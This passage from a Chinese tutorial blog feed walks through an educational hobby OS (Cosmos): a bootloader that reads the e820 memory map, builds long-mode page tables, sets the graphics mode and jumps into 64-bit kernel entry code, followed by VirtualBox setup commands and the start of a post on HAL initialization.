class="type">u64_t</span>)retemnr;</span><br><span class="line">  <span class="comment">// 把e820map_t结构数组大小传给mbsp-&gt;mb_e820sz</span></span><br><span class="line">  mbsp-&gt;mb_e820sz = retemnr * (<span class="built_in">sizeof</span>(<span class="type">e820map_t</span>));</span><br><span class="line">  <span class="comment">// 根据e820map_t结构数据计算内存大小</span></span><br><span class="line">  mbsp-&gt;mb_memsz = <span class="built_in">get_memsize</span>(retemp, retemnr);</span><br><span class="line">  <span class="built_in">init_acpi</span>(mbsp);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>mmap 通过调用 BIOS 中断，获取 e820map 结构数组 。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mmap</span><span class="params">(<span class="type">e820map_t</span> **retemp, <span class="type">u32_t</span> *retemnr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">realadr_call_entry</span>(<span class="built_in">RLINTNR</span>(<span class="number">0</span>), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    *retemnr = *((<span class="type">u32_t</span> *)(E80MAP_NR));</span><br><span class="line">    *retemp = (<span class="type">e820map_t</span> *)(*((<span class="type">u32_t</span> *)(E80MAP_ADRADR)));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>realadr_call_entry 的实现位于 <code>ldrkrl32.asm</code> 中， 该函数的功能是在 C 中语言调用实模式，这里就是调用实模式的 <code>_getmmap</code> 函数，_getmmap 函数调用 BIOS 中断获取 e820map 结构数组。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_getmmap:</span><br><span class="line">	push ds</span><br><span class="line">	push es</span><br><span class="line">	push ss</span><br><span class="line">	mov esi,0</span><br><span class="line">	mov dword[E80MAP_NR],esi				; E80MAP_NR (ETYBAK_ADR+64) 8KB + 64B</span><br><span class="line">	mov dword[E80MAP_ADRADR],E80MAP_ADR		; e820map 结构体开始地址 E80MAP_ADR (0x5000)  14 KB </span><br><span class="line">											; E80MAP_ADRADR (ETYBAK_ADR+68) 8KB + 68B</span><br><span class="line">	xor ebx,ebx</span><br><span class="line">	mov edi,E80MAP_ADR						; edi 设为存放输出结果的 1MB 内的物理内存地址</span><br><span class="line">loop:</span><br><span class="line">	mov eax,0e820h							; 获取 e820map 结构参数</span><br><span class="line">	mov ecx,20								; e820map 结构大小,输出结果数据项的大小为20字节：8字节内存基地址，8字节内存长度，4字节内存类型</span><br><span class="line">	mov edx,0534d4150h						; 获取 e820map 结构参数必须是这个数据</span><br><span class="line">	int 15h									; BIOS 的 15h 中断</span><br><span class="line">	jc .1</span><br><span class="line"></span><br><span class="line">	add edi,20</span><br><span class="line">	cmp edi,E80MAP_ADR+0x1000</span><br><span class="line">	jg .1</span><br><span class="line"></span><br><span class="line">	inc esi</span><br><span class="line"></span><br><span class="line">	cmp ebx,0</span><br><span class="line">	jne loop								; 循环获取 e820map 结构</span><br><span class="line"></span><br><span class="line">	jmp .2</span><br><span class="line"></span><br><span class="line">.1:</span><br><span class="line">	mov esi,0								; 出错处理，e820map 结构数组元素个数为 0</span><br><span class="line"></span><br><span class="line">.2:</span><br><span class="line">	mov dword[E80MAP_NR],esi				; e820map 结构数组元素个数</span><br><span class="line">	pop ss</span><br><span class="line">	pop es</span><br><span class="line">	pop ds</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<p>init_mem 函数在调用 mmap 函数后，就会得到 e820map 结构数组，其首地址和数组元素个数由 retemp、retemnr 两个变量分别提供。</p>
<h2 id="初始化内核栈"><a href="#初始化内核栈" class="headerlink" title="初始化内核栈"></a>初始化内核栈</h2><p>因为我们的操作系统是 C 语言写的，所以需要有栈，下面我们就来给即将运行的内核初始化一个栈。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IKSTACK_PHYADR (0x90000-0x10)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IKSTACK_SIZE 0x1000</span></span><br><span class="line"><span class="comment">// 初始化内核栈</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_krlinitstack</span><span class="params">(<span class="type">machbstart_t</span> *mbsp)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">1</span> &gt; <span class="built_in">move_krlimg</span>(mbsp, (<span class="type">u64_t</span>)(<span class="number">0x8f000</span>), <span class="number">0x1001</span>)) &#123;</span><br><span class="line">    <span class="built_in">kerror</span>(<span class="string">&quot;iks_moveimg err&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  mbsp-&gt;mb_krlinitstack = IKSTACK_PHYADR;  <span class="comment">// 栈顶 0x90000-0x10 = 0x8FFF0</span></span><br><span class="line">  mbsp-&gt;mb_krlitstacksz = IKSTACK_SIZE;    <span class="comment">// 栈大小 0x1000 4K</span></span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断一个地址空间是否和内存中存放的内容有冲突</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">move_krlimg</span><span class="params">(<span class="type">machbstart_t</span> *mbsp, <span class="type">u64_t</span> cpyadr, <span class="type">u64_t</span> cpysz)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0xffffffff</span> &lt;= (cpyadr + cpysz) || <span class="number">1</span> &gt; cpysz)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">void</span> *toadr = (<span class="type">void</span> *)((<span class="type">u32_t</span>)(<span class="built_in">P4K_ALIGN</span>(cpyadr + cpysz)));</span><br><span class="line">    <span class="type">sint_t</span> tosz = (<span class="type">sint_t</span>)mbsp-&gt;mb_imgsz;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != <span class="built_in">adrzone_is_ok</span>(mbsp-&gt;mb_imgpadr, mbsp-&gt;mb_imgsz, cpyadr, cpysz))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> == <span class="built_in">chk_memsize</span>((<span class="type">e820map_t</span> *)((<span class="type">u32_t</span>)(mbsp-&gt;mb_e820padr)), (<span class="type">u32_t</span>)mbsp-&gt;mb_e820nr, (<span class="type">u64_t</span>)((<span class="type">u32_t</span>)toadr), (<span class="type">u64_t</span>)tosz))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">m2mcopy</span>((<span class="type">void</span> *)((<span class="type">u32_t</span>)mbsp-&gt;mb_imgpadr), toadr, tosz);</span><br><span class="line">        mbsp-&gt;mb_imgpadr = (<span class="type">u64_t</span>)((<span class="type">u32_t</span>)toadr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>0x8f000～（0x8f000+0x1001），正是我们的内核栈空间，我们需要检测它是否和其它空间有冲突。</p>
<h2 id="放置内核文件与字库文件"><a href="#放置内核文件与字库文件" class="headerlink" title="放置内核文件与字库文件"></a>放置内核文件与字库文件</h2><p>因为我们的内核已经编译成了一个独立的二进制程序，和其它文件一起被打包到映像文件中了。所以我们必须要从映像中把它解包出来，将其放在特定的物理内存空间中才可以，放置字库文件和放置内核文件的原理一样，所以我们来一起实现。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_krlfile</span><span class="params">(<span class="type">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">u64_t</span> sz = <span class="built_in">r_file_to_padr</span>(mbsp, IMGKRNL_PHYADR, <span class="string">&quot;Cosmos.bin&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == sz)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">kerror</span>(<span class="string">&quot;r_file_to_padr err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 放置完成后更新机器信息结构中的数据</span></span><br><span class="line">    mbsp-&gt;mb_krlimgpadr = IMGKRNL_PHYADR;</span><br><span class="line">    mbsp-&gt;mb_krlsz = sz;</span><br><span class="line">    <span class="comment">// mbsp-&gt;mb_nextwtpadr始终要保持指向下一段空闲内存的首地址 </span></span><br><span class="line">    mbsp-&gt;mb_nextwtpadr = <span class="built_in">P4K_ALIGN</span>(mbsp-&gt;mb_krlimgpadr + mbsp-&gt;mb_krlsz);</span><br><span class="line">    mbsp-&gt;mb_kalldendpadr = mbsp-&gt;mb_krlimgpadr + mbsp-&gt;mb_krlsz;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 放置字库文件</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_defutfont</span><span class="params">(<span class="type">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">u64_t</span> sz = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 获取下一段空闲内存空间的首地址 </span></span><br><span class="line">    <span class="type">u32_t</span> dfadr = (<span class="type">u32_t</span>)mbsp-&gt;mb_nextwtpadr;</span><br><span class="line">    <span class="comment">// 在映像中查找相应的文件，并复制到对应的地址，并返回文件的大小，这里是查找font.fnt文件</span></span><br><span class="line">    sz = <span class="built_in">r_file_to_padr</span>(mbsp, dfadr, <span class="string">&quot;font.fnt&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == sz)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">kerror</span>(<span class="string">&quot;r_file_to_padr err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 放置完成后更新机器信息结构中的数据</span></span><br><span class="line">    mbsp-&gt;mb_bfontpadr = (<span class="type">u64_t</span>)(dfadr);</span><br><span class="line">    mbsp-&gt;mb_bfontsz = sz;</span><br><span class="line">    <span class="comment">// 更新机器信息结构中下一段空闲内存的首地址</span></span><br><span class="line">    mbsp-&gt;mb_nextwtpadr = <span class="built_in">P4K_ALIGN</span>((<span class="type">u32_t</span>)(dfadr) + sz);</span><br><span class="line">    mbsp-&gt;mb_kalldendpadr = mbsp-&gt;mb_bfontpadr + mbsp-&gt;mb_bfontsz;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>放置内核文件与字库文件都是调用 r_file_to_padr 函数在映像中查找 <code>Cosmos.bin</code> 和 <code>font.fnt</code> 文件，并复制到对应的空闲内存空间中。</p>
<h2 id="建立-MMU-页表数据"><a href="#建立-MMU-页表数据" class="headerlink" title="建立 MMU 页表数据"></a>建立 MMU 页表数据</h2><p>我们在二级引导器中建立 MMU 页表数据，目的就是要在内核加载运行之初开启长模式时，MMU 需要的页表数据已经准备好了。</p>
<p>由于我们的内核虚拟地址空间从 0xffff800000000000 开始，所以我们这个虚拟地址映射到从物理地址 0 开始，大小都是 0x400000000 即 16GB，也就是说我们要虚拟地址空间：0xffff800000000000～0xffff800400000000 映射到物理地址空间 0～0x400000000。</p>
<p>我们为了简化编程，使用长模式下的 2MB 分页方式，下面我们用代码实现它，如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_bstartpages</span><span class="params">(<span class="type">machbstart_t</span> *mbsp)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 顶级页目录</span></span><br><span class="line">  <span class="type">u64_t</span> *p = (<span class="type">u64_t</span> *)(KINITPAGE_PHYADR);   <span class="comment">// 16MB</span></span><br><span class="line">  <span class="comment">// 页目录指针</span></span><br><span class="line">  <span class="type">u64_t</span> *pdpte = (<span class="type">u64_t</span> *)(KINITPAGE_PHYADR + <span class="number">0x1000</span>); <span class="comment">// 16MB + 4KB</span></span><br><span class="line">  <span class="comment">// 页目录</span></span><br><span class="line">  <span class="type">u64_t</span> *pde = (<span class="type">u64_t</span> *)(KINITPAGE_PHYADR + <span class="number">0x2000</span>);    <span class="comment">// 16MB + 8KB</span></span><br><span class="line">  <span class="comment">// 物理地址从0开始</span></span><br><span class="line">  <span class="type">u64_t</span> adr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="number">1</span> &gt;</span><br><span class="line">      <span class="built_in">move_krlimg</span>(mbsp, (<span class="type">u64_t</span>)(KINITPAGE_PHYADR), (<span class="number">0x1000</span> * <span class="number">16</span> + <span class="number">0x2000</span>))) &#123;</span><br><span class="line">    <span class="built_in">kerror</span>(<span class="string">&quot;move_krlimg err&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 将顶级页目录、页目录指针的空间清0</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">uint_t</span> mi = <span class="number">0</span>; mi &lt; PGENTY_SIZE; mi++) &#123;</span><br><span class="line">    p[mi] = <span class="number">0</span>;</span><br><span class="line">    pdpte[mi] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 映射 16G 物理内存</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">uint_t</span> pdei = <span class="number">0</span>; pdei &lt; <span class="number">16</span>; pdei++) &#123;</span><br><span class="line">    pdpte[pdei] = (<span class="type">u64_t</span>)((<span class="type">u32_t</span>)pde | KPDPTE_RW | KPDPTE_P);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint_t</span> pdeii = <span class="number">0</span>; pdeii &lt; PGENTY_SIZE;</span><br><span class="line">         pdeii++) &#123;  <span class="comment">// 大页KPDE_PS 2MB，可读写KPDE_RW，存在KPDE_P</span></span><br><span class="line">      pde[pdeii] = <span class="number">0</span> | adr | KPDE_PS | KPDE_RW | KPDE_P;</span><br><span class="line">      adr += <span class="number">0x200000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pde = (<span class="type">u64_t</span> *)((<span class="type">u32_t</span>)pde + <span class="number">0x1000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 让顶级页目录中第 0 项和第 ((KRNL_VIRTUAL_ADDRESS_START) &gt;&gt; KPML4_SHIFT) &amp; 0x1ff 项，指向同一个页目录指针页</span></span><br><span class="line">  p[((KRNL_VIRTUAL_ADDRESS_START) &gt;&gt; KPML4_SHIFT) &amp; <span class="number">0x1ff</span>] =</span><br><span class="line">      (<span class="type">u64_t</span>)((<span class="type">u32_t</span>)pdpte | KPML4_RW | KPML4_P);</span><br><span class="line">  p[<span class="number">0</span>] = (<span class="type">u64_t</span>)((<span class="type">u32_t</span>)pdpte | KPML4_RW | KPML4_P);</span><br><span class="line">  <span class="comment">// 把页表首地址保存在机器信息结构中</span></span><br><span class="line">  mbsp-&gt;mb_pml4padr = (<span class="type">u64_t</span>)(KINITPAGE_PHYADR);</span><br><span class="line">  mbsp-&gt;mb_subpageslen = (<span class="type">u64_t</span>)(<span class="number">0x1000</span> * <span class="number">16</span> + <span class="number">0x2000</span>); <span class="comment">// 页目录大小为 0x1000 * 16 ，顶级页目录 + 页目录指针 = 8KB</span></span><br><span class="line">  mbsp-&gt;mb_kpmapphymemsz = (<span class="type">u64_t</span>)(<span class="number">0x400000000</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>顶级页目录中第 0 项和第 ((KRNL_VIRTUAL_ADDRESS_START) &gt;&gt; KPML4_SHIFT) &amp; 0x1ff 项，指向同一个页目录指针页，这样的话就能让虚拟地址：0xffff800000000000～0xffff800400000000 和虚拟地址：0～0x400000000，访问到同一个物理地址空间 0～0x400000000，这样做是有目的，内核在启动初期，虚拟地址和物理地址要保持相同。</p>
<h2 id="设置图形模式"><a href="#设置图形模式" class="headerlink" title="设置图形模式"></a>设置图形模式</h2><p>切换显卡模式依然要用 BIOS 中断，相关代码如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_graph</span><span class="params">(<span class="type">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 初始化图形数据结构</span></span><br><span class="line">    <span class="built_in">graph_t_init</span>(&amp;mbsp-&gt;mb_ghparm);</span><br><span class="line">    <span class="built_in">init_bgadevice</span>(mbsp);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (mbsp-&gt;mb_ghparm.gh_mode != BGAMODE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 获取VBE模式，通过BIOS中断</span></span><br><span class="line">        <span class="built_in">get_vbemode</span>(mbsp);</span><br><span class="line">        <span class="comment">// 获取一个具体VBE模式的信息，通过BIOS中断</span></span><br><span class="line">        <span class="built_in">get_vbemodeinfo</span>(mbsp);</span><br><span class="line">        <span class="comment">// 设置VBE模式，通过BIOS中断</span></span><br><span class="line">        <span class="built_in">set_vbemodeinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">init_kinitfvram</span>(mbsp);</span><br><span class="line">    <span class="comment">// 显示 logo</span></span><br><span class="line">    <span class="built_in">logo</span>(mbsp);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="显示-Logo"><a href="#显示-Logo" class="headerlink" title="显示 Logo"></a>显示 Logo</h2><p>前面我们已经设置了图形模式，下面就可以显示 logo 图片了。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">logo</span><span class="params">(<span class="type">machbstart_t</span> *mbsp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">u32_t</span> retadr = <span class="number">0</span>, sz = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 在映像文件中获取logo.bmp文件</span></span><br><span class="line">    <span class="built_in">get_file_rpadrandsz</span>(<span class="string">&quot;logo.bmp&quot;</span>, mbsp, &amp;retadr, &amp;sz);</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == retadr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">kerror</span>(<span class="string">&quot;logo getfilerpadrsz err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 显示logo文件中的图像数据</span></span><br><span class="line">    <span class="built_in">bmp_print</span>((<span class="type">void</span> *)retadr, mbsp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="进入-Cosmos"><a href="#进入-Cosmos" class="headerlink" title="进入 Cosmos"></a>进入 Cosmos</h2><p>因为 CPU 进入了长模式，寄存器的位宽都变了，所以需要重新初始化。在 <code>Cosmos/hal/x86/</code> 下建立一个 <code>init_entry.asm</code> 文件，写上后面这段代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[section .start.text]</span><br><span class="line">[BITS 32]</span><br><span class="line">_start:</span><br><span class="line">    cli</span><br><span class="line">    mov ax,0x10</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov ss,ax</span><br><span class="line">    mov fs,ax</span><br><span class="line">    mov gs,ax</span><br><span class="line">    lgdt [eGdtPtr]        </span><br><span class="line">    ;开启 PAE</span><br><span class="line">    mov eax, cr4</span><br><span class="line">    bts eax, 5                      ; CR4.PAE = 1</span><br><span class="line">    mov cr4, eax</span><br><span class="line">    mov eax, PML4T_BADR             ;加载MMU顶级页目录</span><br><span class="line">    mov cr3, eax  </span><br><span class="line">    ;开启 64bits long-mode</span><br><span class="line">    mov ecx, IA32_EFER</span><br><span class="line">    rdmsr</span><br><span class="line">    bts eax, 8                      ; IA32_EFER.LME =1</span><br><span class="line">    wrmsr</span><br><span class="line">    ;开启 PE 和 paging</span><br><span class="line">    mov eax, cr0</span><br><span class="line">    bts eax, 0                      ; CR0.PE =1</span><br><span class="line">    bts eax, 31</span><br><span class="line">    ;开启 CACHE       </span><br><span class="line">    btr eax,29                    ; CR0.NW=0</span><br><span class="line">    btr eax,30                    ; CR0.CD=0  CACHE</span><br><span class="line">    mov cr0, eax                    ; IA32_EFER.LMA = 1</span><br><span class="line">    jmp 08:entry64</span><br><span class="line">[BITS 64]</span><br><span class="line">entry64:</span><br><span class="line">    mov ax,0x10</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov ss,ax</span><br><span class="line">    mov fs,ax</span><br><span class="line">    mov gs,ax</span><br><span class="line">    xor rax,rax</span><br><span class="line">    xor rbx,rbx</span><br><span class="line">    xor rbp,rbp</span><br><span class="line">    xor rcx,rcx</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    xor rdi,rdi</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor r8,r8</span><br><span class="line">    xor r9,r9</span><br><span class="line">    xor r10,r10</span><br><span class="line">    xor r11,r11</span><br><span class="line">    xor r12,r12</span><br><span class="line">    xor r13,r13</span><br><span class="line">    xor r14,r14</span><br><span class="line">    xor r15,r15</span><br><span class="line">    mov rbx,MBSP_ADR</span><br><span class="line">    mov rax,KRLVIRADR</span><br><span class="line">    mov rcx,[rbx+KINITSTACK_OFF]</span><br><span class="line">    add rax,rcx</span><br><span class="line">    xor rcx,rcx</span><br><span class="line">    xor rbx,rbx</span><br><span class="line">    mov rsp,rax</span><br><span class="line">    push 0</span><br><span class="line">    push 0x8</span><br><span class="line">    mov rax,hal_start                 ;调用内核主函数</span><br><span class="line">    push rax</span><br><span class="line">    dw 0xcb48</span><br><span class="line">    jmp $</span><br><span class="line">[section .start.data]</span><br><span class="line">[BITS 32]</span><br><span class="line">x64_GDT:</span><br><span class="line">enull_x64_dsc:  dq 0  </span><br><span class="line">ekrnl_c64_dsc:  dq 0x0020980000000000   ; 64-bit 内核代码段</span><br><span class="line">ekrnl_d64_dsc:  dq 0x0000920000000000   ; 64-bit 内核数据段</span><br><span class="line">euser_c64_dsc:  dq 0x0020f80000000000   ; 64-bit 用户代码段</span><br><span class="line">euser_d64_dsc:  dq 0x0000f20000000000   ; 64-bit 用户数据段</span><br><span class="line">eGdtLen      equ  $ - enull_x64_dsc   ; GDT长度</span><br><span class="line">eGdtPtr:    dw eGdtLen - 1      ; GDT界限</span><br><span class="line">        dq ex64_GDT</span><br></pre></td></tr></table></figure>
<h2 id="使用虚拟机加载二级引导器。"><a href="#使用虚拟机加载二级引导器。" class="headerlink" title="使用虚拟机加载二级引导器。"></a>使用虚拟机加载二级引导器。</h2><p>在源码目录运行 <code>make release</code> 命令，将会产生下面文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  release tree</span><br><span class="line">.</span><br><span class="line">├── background.bmp</span><br><span class="line">├── Cosmos.bin</span><br><span class="line">├── Cosmos.eki</span><br><span class="line">├── font.fnt</span><br><span class="line">├── initldrimh.bin</span><br><span class="line">├── initldrkrl.bin</span><br><span class="line">├── initldrsve.bin</span><br><span class="line">├── lmoskrlimg</span><br><span class="line">└── logo.bmp</span><br></pre></td></tr></table></figure>
<p>挂载 <code>hd.img</code> 至 hdisk 目录，并将 <code>Cosmos.eki</code> 复制到 <code>hdisk/boot</code> 目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo mount -o loop hd.img hdisk/</span><br><span class="line">sudo <span class="built_in">cp</span> release/Cosmos.eki hdisk/boot/HelloOS.eki</span><br><span class="line">sudo umount hdisk/</span><br></pre></td></tr></table></figure>
<p>修改 <code>grub.cfg</code> 文件，将 <code>set root=&#39;hd0,msdos1&#39;</code> 改为 <code>set root=&#39;hd0&#39;</code>，并执行 <code>sudo umount hdisk</code> 命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">menuentry <span class="string">&#x27;HelloOS&#x27;</span> &#123;</span><br><span class="line">insmod part_msdos</span><br><span class="line">insmod ext2</span><br><span class="line"><span class="built_in">set</span> root=<span class="string">&#x27;hd0&#x27;</span>         <span class="comment">#我们的硬盘只有一个分区所以是&#x27;hd0&#x27;</span></span><br><span class="line">multiboot2 /boot/HelloOS.eki  <span class="comment">#加载boot目录下的HelloOS.eki文件</span></span><br><span class="line">boot                          <span class="comment">#引导启动</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">set</span> timeout_style=menu</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$&#123;timeout&#125;</span>&quot;</span> = 0 ]; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">set</span> <span class="built_in">timeout</span>=10              <span class="comment">#等待10秒钟自动启动</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>然后运行下列命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 转换格式</span></span><br><span class="line">VBoxManage convertfromraw hd.img --format VDI hd.vdi</span><br><span class="line"><span class="comment"># 移除之前添加的硬盘控制器</span></span><br><span class="line">VBoxManage storagectl HelloOS --name <span class="string">&quot;IDE&quot;</span> --remove </span><br><span class="line"><span class="comment"># 添加新的硬盘控制器</span></span><br><span class="line">VBoxManage storagectl HelloOS --name <span class="string">&quot;IDE&quot;</span> --add ide --controller PIIX4</span><br><span class="line"><span class="comment"># 删除虚拟硬盘UUID并重新分配</span></span><br><span class="line">VBoxManage closemedium disk hd.vdi</span><br><span class="line"><span class="comment"># 将虚拟硬盘挂到虚拟机的硬盘控制器</span></span><br><span class="line">VBoxManage storageattach HelloOS --storagectl <span class="string">&quot;IDE&quot;</span> --port 0 --device 0 --<span class="built_in">type</span> hdd --medium hd.vdi</span><br><span class="line"><span class="comment"># 启动虚拟机</span></span><br><span class="line">VBoxManage startvm HelloOS</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>操作系统实战</category>
      </categories>
      <tags>
        <tag>操作系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实战06-实现hal层初始化</title>
    <url>/2021/11/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9806-%E5%AE%9E%E7%8E%B0hal%E5%B1%82%E5%88%9D%E5%A7%8B%E5%8C%96/</url>
    <content><![CDATA[<h1 id="第一个-C-函数总体概述"><a href="#第一个-C-函数总体概述" class="headerlink" title="第一个 C 函数总体概述"></a>第一个 C 函数总体概述</h1><p>第一个 C 函数 hal_start 首先初始化 hal 层，其中执行了平台初始化，hal层的内存初始化、中断初始化，最后进入到内核初始化。下面展示了整个执行时序图，先有一个宏观的感官。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">hal_start.c -&gt; hal_start.c : hal_start 处理 hal 层开始函数。 </span><br><span class="line">hal_start.c -&gt; halinit.c : init_hal 初始化 hal 层。</span><br><span class="line">halinit.c -&gt; halplatform.c : init_halplaltform 初始化平台。</span><br><span class="line">halplatform.c -&gt; halplatform.c : init_machbstart 复制二级引导器收集的机器信息结构体。</span><br><span class="line">halplatform.c -&gt; bdvideo.c : init_bdvideo 初始化图形显示驱动。</span><br><span class="line">bdvideo.c -&gt; bdvideo.c : init_dftgraph 初始化图形数据结构，里面放有图形模式，分辨率，图形驱动函数指针。</span><br><span class="line">bdvideo.c -&gt; bdvideo.c : init_bga 初始 bga 图形显卡的函数指针。</span><br><span class="line">bdvideo.c -&gt; bdvideo.c : init_vbe 初始 vbe 图形显卡的函数指针。</span><br><span class="line">bdvideo.c -&gt; bdvideo.c : fill_graph 清空屏幕为黑色。</span><br><span class="line">bdvideo.c -&gt; bdvideo.c : set_charsdxwflush </span><br><span class="line">bdvideo.c -&gt; bdvideo.c : hal_background 显示背景图片。</span><br><span class="line">halinit.c -&gt; halinit.c : move_img2maxpadr 将 img 移动到高地址的内存空间，防止被覆盖。</span><br><span class="line">halinit.c -&gt; halmm.c : init_halmm 初始化内存。</span><br><span class="line">halmm.c -&gt; halmm.c : init_phymmarge 初始化内存并排序。</span><br><span class="line">halinit.c -&gt; halintupt.c : init_halintupt 初始化中断。</span><br><span class="line">halintupt.c -&gt; halintupt.c : init_descriptor 初始化 GDT 描述符 x64_gdt 。</span><br><span class="line">halintupt.c -&gt; halintupt.c : init_idt_descriptor 初始化 IDT 描述符 x64_idt ，绑定了中断编号及中断处理函数。</span><br><span class="line">halintupt.c -&gt; halintupt.c : init_intfltdsc 初始化中断异常表 machintflt ，拷贝了中断相关信息。</span><br><span class="line">halintupt.c -&gt; i8259.c : init_i8259 初始化 8259A 中断控制器。</span><br><span class="line">hal_start.c -&gt; hal_start.c : init_krl 初始化内核层。</span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>
<p>下面在从微观角度看一下每一个功能的实现。</p>
<h1 id="hal-层初始化"><a href="#hal-层初始化" class="headerlink" title="hal 层初始化"></a>hal 层初始化</h1><p>hal 层初始化相关代码在 <code>Cosmos/hal/x86/halinit.c</code> 中实现，比较简单，调用初始化平台、初始化内存、初始化中断的功能，如下所示。</p>
